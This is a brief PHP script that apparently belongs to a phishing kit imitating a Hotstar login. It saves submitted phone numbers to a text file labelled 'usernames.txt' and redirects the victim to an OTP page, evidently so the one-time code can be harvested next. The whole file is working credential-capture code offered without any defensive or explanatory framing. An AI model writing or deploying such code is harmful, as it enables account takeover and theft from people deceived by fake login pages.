<?php
file_put_contents("usernames.txt", "Hotstar Number: " . $_POST['phoneNo'] . "\n", FILE_APPEND);
header('Location: otp.login.php');
exit();
?>